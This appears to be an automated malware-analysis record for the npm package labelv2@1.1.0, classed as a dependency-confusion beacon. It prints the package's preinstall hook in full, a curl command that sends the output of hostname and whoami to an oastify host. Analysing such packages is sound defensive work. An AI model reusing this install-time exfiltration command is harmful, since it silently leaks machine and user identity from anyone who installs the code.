# npm labelv2@1.1.0

**Source:** datadog · **Source label:** malicious · **Released:** 2024-09-22 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has only a package.json. Its preinstall hook runs one shell command: curl POSTs the output of `hostname && whoami` as a URL-encoded `info` field to an oastify (Burp Collaborator style) host over plain HTTP. There are no conditionals, no files run and no manifest platform restrictions, so there are no gates; the beacon fires on every install anywhere curl, hostname and whoami exist and the host is reachable.

## Execution

- **preinstall** `curl --data-urlencode "info=$(hostname && whoami)" hxxp://446se5e8fhe8damhbh7h9duleck38twi[.]oastify[.]com`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: 446se5e8fhe8damhbh7h9duleck38twi[.]oastify[.]com:80 (curl sends the hostname and username to this out-of-band interaction (oastify) host over plain HTTP)
- installed_tool: curl, hostname, whoami (the hook calls curl, with hostname and whoami inside a command substitution)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- launch_style changed from the tool's download_then_exec to inline_shell, since the response is never executed or saved.
- attack_type dependency_confusion is inferred from the pattern (generic internal-looking name, empty description, hostname/whoami callback to an interaction-capture service); there is no registry metadata in the package that proves it.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "labelv2",
    "version": "1.1.0",
    "archive_sha256": "93805baea1eff095f5a1658736690b4d0da7b9200d0041873934f1131d49c32a",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2024-09-22",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2024-09-24-labelv2-v1.1.0.zip",
    "package_root": "layer0/tmp/tmptms67q1b/labelv2/package",
    "cluster_key": "7067dcfcbe1234938ec02ce22a489c0012ba965d2fd4d0c4a6feadf1f2eb294a",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl --data-urlencode \"info=$(hostname && whoami)\" hxxp://446se5e8fhe8damhbh7h9duleck38twi[.]oastify[.]com",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json is the only file in the package; read in full. The preinstall hook is one shell command with no conditionals and runs no package files, so there are no gates.",
      "launch_style corrected from download_then_exec to inline_shell: curl only POSTs data and nothing it receives is executed or written."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "446se5e8fhe8damhbh7h9duleck38twi[.]oastify[.]com:80",
      "reason": "curl sends the hostname and username to this out-of-band interaction (oastify) host over plain HTTP"
    },
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "hostname",
        "whoami"
      ],
      "reason": "the hook calls curl, with hostname and whoami inside a command substitution"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://446se5e8fhe8damhbh7h9duleck38twi[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify hostname/whoami install beacon",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook unconditionally sends the machine hostname and current username to an out-of-band interaction (oastify) host on every install. Nothing else runs; it is an ungated recon and exfil beacon.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@44d785b257",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
